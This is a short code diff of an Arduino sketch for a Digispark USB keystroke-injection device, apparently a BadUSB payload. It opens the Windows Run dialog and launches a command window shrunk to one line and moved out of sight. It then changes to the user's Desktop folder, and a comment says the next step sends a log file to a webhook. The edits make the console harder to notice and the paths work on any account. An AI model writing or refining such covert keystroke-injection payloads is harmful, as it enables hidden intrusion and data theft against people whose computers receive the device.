@@ -30,7 +30,7 @@ void loop() {
  
   DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT); //run
   DigiKeyboard.delay(100);
-  DigiKeyboard.println("cmd"); //smallest cmd window possible
+  DigiKeyboard.println("cmd /k mode con: cols=15 lines=1"); //smallest cmd window possible
     DigiKeyboard.delay(500);
   DigiKeyboard.delay(500);
   DigiKeyboard.sendKeyStroke(KEY_SPACE, MOD_ALT_LEFT); //Menu  
@@ -41,7 +41,7 @@ void loop() {
     }
   DigiKeyboard.sendKeyStroke(KEY_ENTER); //Detach from scrolling
   DigiKeyboard.delay(100);
-  DigiKeyboard.println("cd Desktop ");
+  DigiKeyboard.println("cd %userprofile%/Desktop ");
   DigiKeyboard.delay(500);
 
  //sending the logfile to webhook
